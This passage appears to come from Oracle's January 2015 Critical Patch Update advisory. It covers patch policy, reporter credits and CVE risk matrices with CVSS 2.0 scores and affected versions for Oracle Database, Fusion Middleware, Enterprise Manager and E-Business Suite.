| Oracle Applications - Oracle Supply Chain, PeopleSoft Enterprise, JD Edwards Product Suite, Siebel and iLearning | [Oracle Supply Chain Risk Matrix](#AppendixSCP) [Oracle PeopleSoft Enterprise Risk Matrix](#AppendixPS) [Oracle JD Edwards Risk Matrix](#AppendixJDE) [Oracle Siebel Risk Matrix](#AppendixSECR) [Oracle iLearning Risk Matrix](#AppendixILRN) | Critical Patch Update Knowledge Document for Oracle Supply Chain, PeopleSoft Enterprise, JD Edwards, Siebel and iLearning Product Suite [My Oracle Support Note 1955920.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1) |
| Oracle Communications Industry Suite | [Oracle Communications Applications Risk Matrix](#AppendixCGBU) | Patch Set Update and Critical Patch Update January 2015 Availability Document, [My Oracle Support Note 1958369.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1958369.1) |
| Oracle Retail Industry Suite | [Oracle Retail Applications Risk Matrix](#AppendixRAPP) | Patch Set Update and Critical Patch Update January 2015 Availability Document, [My Oracle Support Note 1955864.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955864.1) |
| Oracle Health Sciences Industry Suite | [Oracle Health Sciences Applications Risk Matrix](#AppendixHCAR) | Patch Set Update and Critical Patch Update January 2015 Availability Document, [My Oracle Support Note 1958531.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1958531.1) |
| Oracle Java SE | [Oracle SE Risk Matrix](#AppendixJAVA) | * Critical Patch Update January 2015 Patch Availability Document for Java SE, [My Oracle Support Note 1948935.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1948935.1) * Users running Java SE with a browser can download the latest release from [http://java.com.](http://java.com) Users on the Windows and Mac OS X platforms can also use [automatic updates](http://www.java.com/en/download/help/5000020700.xml) to get the latest release. * The latest JavaFX release is included with the latest update of JDK and JRE 7 and 8. |
| Oracle and Sun Systems Products Suite | [Oracle and Sun Systems Products Suite Risk Matrix](#AppendixSUNS) | Critical Patch Update January 2015 Patch Delivery Document for Oracle and Sun Systems Product Suite, [My Oracle Support Note 1956176.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1956176.1) |
| Oracle Linux and Virtualization Products | [Oracle Linux and Virtualization Products Risk Matrix](#AppendixOVIR) | Patch Set Update and Critical Patch Update January 2015 Availability Document, [My Oracle Support Note 1955899.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955899.1) |
| Oracle MySQL | [Oracle MySQL Risk Matrix](#AppendixMSQL) | Critical Patch Update January 2015 Patch Availability Document for Oracle MySQL Products, [My Oracle Support Note 1956125.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1956125.1) |

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in  [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is available  [here](/security-alerts/cpujan2015verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](//cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same**CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 2.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS 2.0). Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see  [Oracle vulnerability disclosure policies](https://www.oracle.com/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the only variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review  [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update January 2015 Availability Document,  [My Oracle Support Note 1942215.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](https://www.oracle.com/support/lifetime-support/) . We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in  [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1) .Please review the  [Technical Support Policies](https://www.oracle.com/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](https://www.oracle.com/support/lifetime-support/) . Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

### Credit Statement

The following people or organizations reported security vulnerabilities addressed by this Critical Patch Update to Oracle: Adam Willard of Foreground Security; Advanced Threat Research Team, Intel Security; Alexander Chizhov; Alexey Makhmutov; Bart Kulach of NN Group N.V.; David Litchfield of Datacom TSS; Diego Matos of CIPHER Intelligence Lab; Edmund Goh of KPMG Management Consulting, Singapore; Edward Torkington of NCC Group; Frank Cozijnsen of KPN; Gabor Pesti; George Nosenko of Digital Security Research Group; Jeremy Brown of Microsoft; Joeri de Ruiter of Radboud University Nijmegen; Karthikeyan Bhargavan; Khai Tran of Netspi; Khalifa Al Shamsi of Help AG; Nicolas Ruff of the Google Security Team; Oliver Gruskovnjak of Portcullis Inc; Red Hat Product Security; Tor Erling Bjorstad of Mnemonic AS; Tudor Enache of Help AG; Vivek Singh of FINRA; and Wouter Coekaerts.

#### Security-In-Depth Contributors

Oracle provides recognition to people that have contributed to our Security-In-Depth program ( [see FAQ](/security-alerts/cpufaq.html)). People are recognized for Security-In-Depth contributions if they provide information, observations or suggestions pertaining to security vulnerability issues that result in significant modification of Oracle code or documentation in future releases, but are not of such a critical nature that they are distributed in Critical Patch Updates.

In this Critical Patch Update Advisory, Oracle recognizes Alexander Kornbrust of Red Database Security; Bruce Robb of J&B Computing Services; and Yasumasa Suenaga for contributions to Oracle's Security-In-Depth program.

#### On-Line Presence Security Contributors

Oracle provides recognition to people that have contributed to our On-Line Presence Security program (see  [FAQ](/security-alerts/cpufaq.html)). People are recognized for contributions relating to Oracle's on-line presence if they provide information, observations or suggestions pertaining to security-related issues that result in significant modification to Oracle's on-line external-facing systems.

For this quarter, Oracle recognizes Abdullah Erdem; Adam Willard of Foreground Security; Amir Sohail; Arjun V; Avik Sarkar; Ayoub Nait Lamine; Ben Khlifa Fahmi; Cameron Crowley; Christian Galeone; Gaurav Mishra; Gopal Bisht; Gurjant Singh Sadhra; Karthik E C; Koutrouss Naddara; M.Asim Shahzad; Mohammed Osman; Monendra Sahu; Mousab Elhag; Muhammad Sarmad Shafiq; Rakesh Singh of Zero Day Guys; Sandeep Venkatesan; Sky\_BlaCk; Sreehari; Srikanth Y; and Yann CAM for contributions to Oracle's On-Line Presence Security program.

### Critical Patch Update Schedule

Critical Patch Updates are released on the Tuesday closest to the 17th day of January, April, July and October. The next four dates are:

* 14 April 2015
* 14 July 2015
* 20 October 2015
* 19 January 2016

### References

* Oracle Critical Patch Updates and Security Alerts main page [ [Oracle Technology Network](/security-alerts/) ]
* Critical Patch Update - January 2015 Documentation Map [  [My Oracle Support Note 1935468.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1935468.1)  ]
* Oracle Critical Patch Updates and Security Alerts - Frequently Asked Questions [  [CPU FAQ](/security-alerts/cpufaq.html)  ]
* Risk Matrix definitions [  [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html) ]
* Use of Common Vulnerability Scoring System (CVSS) by Oracle [  [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) ]
* English text version of the risk matrices [ [Oracle Technology Network](/security-alerts/cpujan2015verbose.html) ]
* CVRF XML version of the risk matrices [  [Oracle Technology Network](/a/tech/docs/2367957.xml) ]
* The Oracle Software Security Assurance Blog [ [The Oracle Software Security Assurance Blog](https://blogs.oracle.com/security/) ]
* List of public vulnerabilities fixed in Critical Patch Updates and Security Alerts [ [Oracle Technology Network](/security-alerts/public-vuln-to-advisory-mapping.html) ]
* Software Error Correction Support Policy [  [My Oracle Support Note 209768.1](https:///https%3A//support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1) ]

### Modification History

| Date | Note |
| --- | --- |
| 2015-January-20 | Rev 1. Initial Release |
| 2015-March-10 | Rev 2. Updated credit information. |

### Appendix - Oracle Database Server

#### Oracle Database Server Executive Summary

This Critical Patch Update contains 8 new security fixes for the Oracle Database Server. None of these vulnerabilities may be remotely exploitable without authentication, i.e., none may be exploited over a network without the need for a username and password. None of these fixes are applicable to client-only installations, i.e., installations that do not have the Oracle Database Server installed. The English text form of this Risk Matrix can be found  [here](/security-alerts/cpujan2015verbose.html#DB).

#### Oracle Database Server Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2014-6567 | Core RDBMS | Oracle Net | Create Session | No | 9.0 | Network | Low | Single | Complete | Complete | Complete | 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, 12.1.0.2 | See Note 1 |
| CVE-2014-6577 | XML Developer's Kit for C | HTTP | Valid account | No | 6.8 | Network | Low | Single | Complete | None | None | 11.2.0.3, 11.2.0.4, 12.1.0.1, 12.1.0.2 | See Note 2 |
| CVE-2015-0373 | OJVM | Oracle Net | Create Session | No | 6.5 | Network | Low | Single | Partial+ | Partial+ | Partial+ | 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, 12.1.0.2 | See Note 3 |
| CVE-2014-6578 | Workspace Manager | Oracle Net | Create Table, Create Procedure, Execute on SDO\_TOPO, Execute on WMSYS.LT | No | 6.5 | Network | Low | Single | Partial+ | Partial+ | Partial+ | 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1 |  |
| CVE-2014-6541 | Recovery | Oracle Net | Execute on DBMS\_IR | No | 6.3 | Network | Medium | Single | Complete | None | None | 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, 12.1.0.2 | See Note 4 |
| CVE-2015-0371 | Core RDBMS | Oracle Net | Create Session, Create Table | No | 4.9 | Network | Medium | Single | None | Partial+ | Partial | 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1 |  |
| CVE-2014-6514 | PL/SQL | Oracle Net | Create Session | No | 4.0 | Network | Low | Single | Partial+ | None | None | 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1 |  |
| CVE-2015-0370 | Core RDBMS | Oracle Net | Create Session | No | 3.5 | Network | Medium | Single | None | Partial | None | 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1 |  |

#### Notes:

1. The CVSS Score is 9.0 only on Windows for Database versions prior to 12c. The CVSS Base Score is 6.5 (Confidentiality, Integrity and Availability are Partial+) for Database 12c on Windows and for all versions of Database on Linux, Unix and other platforms.
2. The CVSS score is 6.8 only on Windows for Database versions prior to 12c. The CVSS is 4.0 (Confidentiality is "Partial+") for Database 12c on Windows and for all versions of Database on Linux, Unix and other platforms.
3. This brings the OJVM component of Database in line with Java SE security fixes delivered as of January CPU 2015.
4. This vulnerability is only applicable on a Windows operating system. The CVSS score is 6.3 for Database versions prior to 12c. The CVSS is 3.5 (Confidentiality is "Partial+") for Database 12c.

### Appendix - Oracle Fusion Middleware

#### Oracle Fusion Middleware Executive Summary

This Critical Patch Update contains 36 new security fixes for Oracle Fusion Middleware. 28 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#FMW).

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security fixes are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the January 2015 Critical Patch Update to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update January 2015 Patch Availability Document for Oracle Products,  [My Oracle Support Note 1942215.1 1.](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1)

#### Oracle Fusion Middleware Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2011-1944 | Oracle HTTP Server | HTTP | Web Listener | Yes | 9.3 | Network | Medium | None | Complete | Complete | Complete | 11.1.1.7.0, 12.1.2.0, 12.1.3.0 |  |
| CVE-2014-0224 | Oracle Exalogic Infrastructure | HTTP | Network Infra Framework | Yes | 7.6 | Network | High | None | Complete | Complete | Complete | 2.0.6.2.0 (for all X2-2, X3-2, X4-2) |  |
| CVE-2013-1741 | Oracle Directory Server Enterprise Edition | HTTPS | Admin Server | Yes | 7.5 | Network | Low | None | Partial+ | Partial+ | Partial+ | 7.0, 11.1.1.7 | See Note 1 |
| CVE-2015-0396 | Oracle GlassFish Server | HTTP | Admin Console | Yes | 7.5 | Network | Low | None | Partial | Partial | Partial | 3.0.1, 3.1.2 |  |
| CVE-2014-0114 | Oracle Real-Time Decision Server | HTTP | Decision Server | Yes | 7.5 | Network | Low | None | Partial | Partial | Partial | 11.1.1.7, RTD Platform 3.0.x |  |
| CVE-2014-0114 | Oracle Waveset | HTTP | Struts | Yes | 7.5 | Network | Low | None | Partial | Partial | Partial | 8.1.1 |  |
| CVE-2014-0114 | Oracle WebLogic Portal | HTTP | Third Party Tools | Yes | 7.5 | Network | Low | None | Partial+ | Partial+ | Partial+ | 10.0.1.0, 10.2.1.0, 10.3.6.0 |  |
| CVE-2013-2186 | Oracle WebLogic Server | HTTP | WLS Config, WLS Console | Yes | 7.5 | Network | Low | None | Partial | Partial | Partial | 10.3.6.0, 12.1.1.0, 12.1.2.0, 12.1.3.0 | See Note 2 |
| CVE-2014-0226 | Oracle HTTP Server | HTTP | Web Listener | Yes | 6.8 | Network | Medium | None | Partial | Partial | Partial | 10.1.3.5.0, 11.1.1.7.0, 12.1.2.0, 12.1.3.0 | See Note 3 |
| CVE-2014-6571 | Oracle HTTP Server | HTTP | Web Listener | Yes | 6.8 | Network | Medium | None | Partial | Partial | Partial | 11.1.1.7.0, 12.1.2.0, 12.1.3.0 |  |
| CVE-2013-4286 | BI Publisher (formerly XML Publisher) | HTTP | BI Publisher Security | Yes | 5.8 | Network | Medium | None | Partial | Partial | None | 10.1.3.4.2, 11.1.1.7 |  |
| CVE-2014-6576 | Oracle Adaptive Access Manager | HTTP | OAM Integration | No | 5.5 | Network | Low | Single | Partial | Partial | None | 11.1.1.5, 11.1.1.7, 11.1.2.1, 11.1.2.2 |  |
| CVE-2015-0362 | BI Publisher (formerly XML Publisher) | HTTP | BI Publisher Security | Yes | 5.0 | Network | Low | None | Partial | None | None | 11.1.1.7 |  |
| CVE-2015-0367 | Oracle Access Manager | HTTP | SSO Engine | Yes | 5.0 | Network | Low | None | None | Partial | None | 11.1.1.5, 11.1.1.7, 11.1.2.1, 11.1.2.2 | See Note 4 |
| CVE-2015-0372 | Oracle Containers for J2EE | HTTP | None | Yes | 5.0 | Network | Low | None | Partial+ | None | None | 10.1.3.5 |  |
| CVE-2013-2877 | Oracle HTTP Server | HTTP | Web Listener | Yes | 5.0 | Network | Low | None | None | None | Partial | 11.1.1.7.0, 12.1.2.0, 12.1.3.0 |  |
| CVE-2014-0098 | Oracle HTTP Server | HTTP | Web Listener | Yes | 5.0 | Network | Low | None | None | None | Partial | 10.1.3.5.0, 11.1.1.7.0, 12.1.2.0, 12.1.3.0 |  |
| CVE-2013-6438 | Oracle HTTP Server | HTTP | Web Listener | Yes | 5.0 | Network | Low | None | None | None | Partial | 10.1.3.5.0, 11.1.1.7.0, 12.1.2.0, 12.1.3.0 |  |
| CVE-2013-5704 | Oracle HTTP Server | HTTP | Web Listener | Yes | 5.0 | Network | Low | None | None | Partial | None | 10.1.3.5.0, 11.1.1.7.0, 12.1.2.0, 12.1.3.0 |  |
| CVE-2014-6569 | Oracle WebLogic Server | HTTP | CIE Related Components | Yes | 5.0 | Network | Low | None | Partial | None | None | 10.0.2.0, 10.3.6.0, 12.1.1.0, 12.1.2.0 |  |
| CVE-2014-6548 | Oracle SOA Suite | HTTP | B2B Engine | No | 4.6 | Local | Low | None | Partial+ | Partial+ | Partial+ | 11.1.1.7 | See Note 5 |
| CVE-2011-3607 | Oracle HTTP Server | HTTP | Web Listener | No | 4.4 | Local | Medium | None | Partial | Partial | Partial | 10.1.3.5.0, 11.1.1.7.0, 12.1.2.0 |  |
| CVE-2015-0434 | Oracle Access Manager | HTTP | Integration with OAM | Yes | 4.3 | Network | Medium | None | Partial | None | None | 11.1.1.5, 11.1.1.7, 11.1.2.1, 11.1.2.2 |  |
| CVE-2014-6526 | Oracle Directory Server Enterprise Edition | HTTP | Admin Console | Yes | 4.3 | Network | Medium | None | None | Partial | None | 7.0 |  |
| CVE-2015-0420 | Oracle Forms | HTTP | Forms Services | Yes | 4.3 | Network | Medium | None | Partial | None | None | 11.1.1.7, 11.1.2.2 |  |
| CVE-2014-0191 | Oracle HTTP Server | HTTP | Web Listener | Yes | 4.3 | Network | Medium | None | None | None | Partial | 11.1.1.7.0, 12.1.2.0, 12.1.3.0 |  |
| CVE-2013-0338 | Oracle HTTP Server | HTTP | Web Listener | Yes | 4.3 | Network | Medium | None | None | None | Partial | 11.1.1.7.0, 12.1.2.0, 12.1.3.0 |  |
| CVE-2015-0386 | Oracle HTTP Server | HTTP | Web Listener | Yes | 4.3 | Network | Medium | None | None | None | Partial | 11.1.1.7.0, 12.1.2.0, 12.1.3.0 |  |
| CVE-2014-6580 | Oracle Reports Developer | HTTP | None | Yes | 4.3 | Network | Medium | None | None | Partial | None | 11.1.1.7, 11.1.2.2 |  |
| CVE-2011-3389 | Oracle Security Service | HTTPS | None | Yes | 4.3 | Network | Medium | None | Partial | None | None | OHS: 12.1.2, FMW: 12.1.3 |  |
| CVE-2015-0376 | Oracle WebCenter Content | HTTP | Content Server | Yes | 4.3 | Network | Medium | None | None | Partial | None | 11.1.1.8.0 |  |
| CVE-2015-0399 | Oracle Business Intelligence Enterprise Edition | HTTP | Analytics Web General | No | 4.0 | Network | Low | Single | Partial | None | None | 10.1.3.4.2, 11.1.1.7 |  |
| CVE-2015-0401 | Oracle Directory Server Enterprise Edition | HTTP | Admin Console | No | 4.0 | Network | Low | Single | None | Partial+ | None | 7.0, 11.1.1.7 |  |
| CVE-2015-0389 | Oracle OpenSSO | HTTP | SAML | No | 3.5 | Network | Medium | Single | None | Partial | None | 8.0 Update 2 Patch 5 |  |
| CVE-2014-6592 | Oracle OpenSSO | HTTP | SAML | No | 3.5 | Network | Medium | Single | None | Partial | None | 8.0 Update 2 Patch 5 |  |
| CVE-2015-0414 | Oracle SOA Suite | HTTP | Fabric Layer | No | 3.5 | Network | Medium | Single | Partial+ | None | None | 11.1.1.7, 12.1.3.0 |  |

#### Notes:

1. This fix also addresses CVE-2013-1620, CVE-2013-1739,CVE-2013-1740, CVE-2013-5605, CVE-2013-5606,CVE-2014-1490, CVE-2014-1491 and CVE-2014-1492.
2. This fix also addresses CVE-2014-0050. The CVSS score is taken from  [http://nvd.nist.gov/vuln/detail/CVE-2013-2186](https://nvd.nist.gov/vuln/detail/CVE-2013-2186).
3. This fix also addresses CVE-2014-0117, CVE-2014-0118 and CVE-2014-0231.
4. Please refer to  [My Oracle Support Note 1952939.1](https:///https%3A//support.oracle.com/epmos/faces/DocumentDisplay?id=1952939.1) for instructions on how to address this issue.
5. Please refer to  [My Oracle Support Note 1962206.1](https:///https%3A//support.oracle.com/epmos/faces/DocumentDisplay?id=1962206.1) for instructions on how to address this issue.

### Appendix - Oracle Enterprise Manager Grid Control

#### Oracle Enterprise Manager Grid Control Executive Summary

This Critical Patch Update contains 10 new security fixes for Oracle Enterprise Manager Grid Control. All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. None of these fixes are applicable to client-only installations, i.e., installations that do not have Oracle Enterprise Manager Grid Control installed. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#EM).

Oracle Enterprise Manager products include  [Oracle Database](https:///security-alerts/cpujan2015.html#AppendixDB) and  [Oracle Fusion Middleware](https:///security-alerts/cpujan2015.html#AppendixFMW) components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle Enterprise Manager products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle Enterprise Manager risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle Enterprise Manager products, Oracle recommends that customers apply the January 2015 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Enterprise Manager. For information on what patches need to be applied to your environments, refer to Critical Patch Update January 2015 Patch Availability Document for Oracle Products,  [My Oracle Support Note 1942215.1](http:///https%3A//support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1).

#### Oracle Enterprise Manager Grid Control Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2013-2186 | Enterprise Manager Ops Center | HTTP | File Upload Utility | Yes | 7.5 | Network | Low | None | Partial | Partial | Partial | 11.1.3, 12.1.4 | See Note 1 |
| CVE-2014-0226 | Enterprise Manager Ops Center | HTTP | Update Provisioning | Yes | 6.8 | Network | Medium | None | Partial | Partial | Partial | 11.1.3, 12.1.4 | See Note 2 |
| CVE-2014-0224 | Enterprise Manager Ops Center | SSL/TLS | Networking | Yes | 6.8 | Network | Medium | None | Partial | Partial | Partial | 11.1.3, 12.1.4 |  |
| CVE-2011-4461 | Enterprise Manager Base Platform | HTTP | Agent | Yes | 5.0 | Network | Low | None | None | None | Partial | 12.1.0.3 |  |
| CVE-2015-0426 | Enterprise Manager Base Platform | HTTP | UI Framework | Yes | 5.0 | Network | Low | None | Partial | None | None | 12.1.0.3, 12.1.0.4 |  |
| CVE-2014-4212 | Enterprise Manager Base Platform | HTTPS | Process Management & Notification | Yes | 4.3 | Network | Medium | None | Partial | None | None | 12.1.0.3, 12.1.0.4 |  |
| CVE-2014-6573 | Enterprise Manager Ops Center | HTTP | User Interface Framework | Yes | 4.3 | Network | Medium | None | None | Partial | None | 11.1.3, 12.1.4 |  |
| CVE-2013-1620 | Enterprise Manager Ops Center | SSL/TLS | Network | Yes | 4.3 | Network | Medium | None | Partial | None | None | 11.1, 12.1, 12.2 |  |
| CVE-2013-4545 | Enterprise Manager Ops Center | SSL/TLS | Update Provisioning | Yes | 4.3 | Network | Medium | None | None | Partial | None | 11.1.3, 12.1.4 | See Note 3 |
| CVE-2014-3566 | Enterprise Manager Ops Center | SSL/TLS | Update Provisioning | Yes | 4.3 | Network | Medium | None | Partial | None | None | 11.1.3, 12.1.4 |  |

#### Notes:

1. This fix also addresses CVE-2014-0050. The CVSS score is taken from  [http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-2186](//web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-2186).
2. This fix also addresses CVE-2014-0117, CVE-2014-0118 and CVE-2014-0231.
3. This fix also addresses CVE-2014-0015.

### Appendix - Oracle Applications

#### Oracle E-Business Suite Executive Summary

This Critical Patch Update contains 10 new security fixes for the Oracle E-Business Suite. 6 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#EBS).

Oracle E-Business Suite products include  [Oracle Database](https:///security-alerts/cpujan2015.html#AppendixDB) and  [Oracle Fusion Middleware](https:///security-alerts/cpujan2015.html#AppendixFMW) components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle E-Business Suite products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle E-Business Suite risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle E-Business Suite products, Oracle recommends that customers apply the January 2015 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Oracle E-Business Suite. For information on what patches need to be applied to your environments, refer to Oracle E-Business Suite Releases 11i and 12 Critical Patch Update Knowledge Document (January 2015),  [My Oracle Support Note 1954250.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1954250.1).

#### Oracle E-Business Suite Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2014-6581 | Oracle Customer Intelligence | HTTP | Extract/Load Programs | Yes | 6.4 | Network | Low | None | Partial+ | Partial+ | None | 11.5.10.2, 12.0.4, 12.0.5, 12.0.6, 12.1.1, 12.1.2, 12.1.3, 12.2.2, 12.2.3, 12.2.4 |  |
| CVE-2014-6572 | Oracle Customer Interaction History | HTTP | List of Values | Yes | 6.4 | Network | Low | None | Partial | Partial | None | 12.0.4, 12.0.5, 12.0.6, 12.1.1, 12.1.2, 12.1.3, 12.2.2, 12.2.3, 12.2.4 |  |
| CVE-2014-6583 | Oracle Marketing | HTTP | Audience | Yes | 6.4 | Network | Low | None | Partial+ | Partial+ | None | 11.5.10.2, 12.0.4, 12.0.5, 12.0.6, 12.1.1, 12.1.2, 12.1.3. |  |
| CVE-2015-0393 | Oracle Applications DBA | Oracle Net | DB Privileges | No | 6.0 | Network | Medium | Single | Partial+ | Partial+ | Partial+ | 11.5.10.2, 12.0.6, 12.1.3, 12.2.2, 12.2.3, 12.2.4 |  |
| CVE-2014-6582 | Oracle HCM Configuration Workbench | HTTP | Rapid Implementation | Yes | 5.0 | Network | Low | None | Partial | None | None | 11.5.10.2, 12.0.4, 12.0.5, 12.0.6, 12.1.1, 12.1.2, 12.1.3, 12.2.2, 12.2.3, 12.2.4 |  |
| CVE-2014-6556 | Oracle Applications DBA | Oracle Net | AD\_DDL | No | 4.6 | Network | High | Single | Partial+ | Partial+ | Partial+ | 11.5.10.2, 12.0.6, 12.1.3, 12.2.2, 12.2.3, 12.2.4 |  |
| CVE-2015-0404 | Oracle Applications Framework | HTTP | Error Messages | Yes | 4.3 | Network | Medium | None | None | Partial | None | 11.5.10.2, 12.0.6, 12.1.3, 12.2.2, 12.2.3, 12.2.4 |  |
| CVE-2015-0380 | Oracle Telecommunications Billing Integrator | HTTP | OA Based UI for Bill Summary | Yes | 4.3 | Network | Medium | None | None | Partial | None | 11.5.10.2, 12.0.4, 12.0.5, 12.0.6, 12.1.1, 12.1.2, 12.1.3, 12.2.2, 12.2.3, 12.2.4 |  |
| CVE-2015-0415 | Oracle Application Object Library | HTTP | Session Management | No | 4.0 | Network | Low | Single | None | Partial | None | 12.1.3 |  |
